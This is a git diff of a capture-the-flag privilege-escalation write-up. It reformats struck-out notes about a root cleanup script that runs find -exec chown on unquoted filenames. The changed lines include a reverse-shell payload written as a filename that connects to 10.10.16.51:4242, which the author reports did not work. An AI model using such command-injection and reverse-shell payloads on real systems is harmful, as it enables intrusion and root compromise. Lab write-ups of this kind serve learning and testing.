@@ -131,31 +131,22 @@ fi
 find source_images -type f -name '*.jpg' -exec chown root:root {} \;
 
 ```
-~~So the script takes a log file, stores it as an old log and truncates the new log, it then finds all .jpg files within the /home/wizard/photobomb folder and execs chown as root on all of them.
+~So the script takes a log file, stores it as an old log and truncates the new log, it then finds all .jpg files within the /home/wizard/photobomb folder and execs chown as root on all of them.~
 
-now usually if a script is ran as root, while taking input from a user (which in this case would be the file names within the photobomb folder) is very unsecure (good for us :))
+~now usually if a script is ran as root, while taking input from a user (which in this case would be the file names within the photobomb folder) is very unsecure (good for us :))~
 
-first things first i want to take a look at the man page for find, to see how the -exec flag actually works
-```
--exec command {} +
-              This  variant  of the -exec action runs the specified command on
-              the selected files, but the command line is built  by  appending
-              each  selected file name at the end; the total number of invoca‐
-              tions of the command will  be  much  less  than  the  number  of
-              matched  files.   The command line is built in much the same way
-              that xargs builds its command lines.  Only one instance of  `{}'
-              is  allowed  within the command, and (when find is being invoked
-              from a shell) it should be quoted (for example, '{}') to protect
-              it  from  interpretation  by shells.  The command is executed in
-              the starting directory.  If any invocation with the `+' form re‐
-              turns  a non-zero value as exit status, then find returns a non-
-              zero exit status.  If find encounters an error, this  can  some‐
-              times  cause an immediate exit, so some pending commands may not
-              be run at all.  This variant of -exec always returns true.
-```
-The important thing to note is here is is that the man page suggests to quote the {} whereas in the script it's not quoted! could this mean a crafted filename could be used to make the super user run a reverse shell connection?
-A filename that could fit could be "bash -i >& /dev/tcp/10.10.16.51/4242 0>&1;a.jpg"
-After some testing it doesn't seem to work out the way i wanted, however whilst looking on gtfobins (a site which shows which binaries can be used to gain root access) i found that the find command could be used to gain sudo if~~
+~first things first i want to take a look at the man page for find, to see how the -exec flag actually works~
+
+~`exec command {} +`~
+
+~`This  variant  of the -exec action runs the specified command on the selected files, but the command line is built  by  appending each  selected file name at the end; the total number of invocations of the command will  be  much  less  than  the  number  of matched  files.   The command line is built in much the same way that xargs builds its command lines.  Only one instance of  {} is  allowed  within the command, and (when find is being invoked from a shell) it should be quoted (for example, {}) to protect it  from  interpretation  by shells.  The command is executed in the starting directory.  If any invocation with the + form returns  a non-zero value as exit status, then find returns a non zero exit status.  If find encounters an error, this  can  some‐times  cause an immediate exit, so some pending commands may not be run at all.  This variant of -exec always returns true.`~
+
+~The important thing to note is here is is that the man page suggests to quote the {} whereas in the script it's not quoted! could this mean a crafted filename could be used to make the super user run a reverse shell connection?~
+
+~A filename that could fit could be "bash -i >& /dev/tcp/10.10.16.51/4242 0>&1;a.jpg"~
+
+~After some testing it doesn't seem to work out the way i wanted, however whilst looking on gtfobins (a site which shows which binaries can be used to gain root access) i found that the find command could be used to gain sudo if~
+
 Ok, so i was on the wrong track there, i should really check every part of the linpeas file myself before i move onto attempting exploitation. lesson learned.
 The current user (Wizard) can run a specific shell script (/opt/cleanup.sh) AND change environment variables as sudo with no password neccessary:
 ```
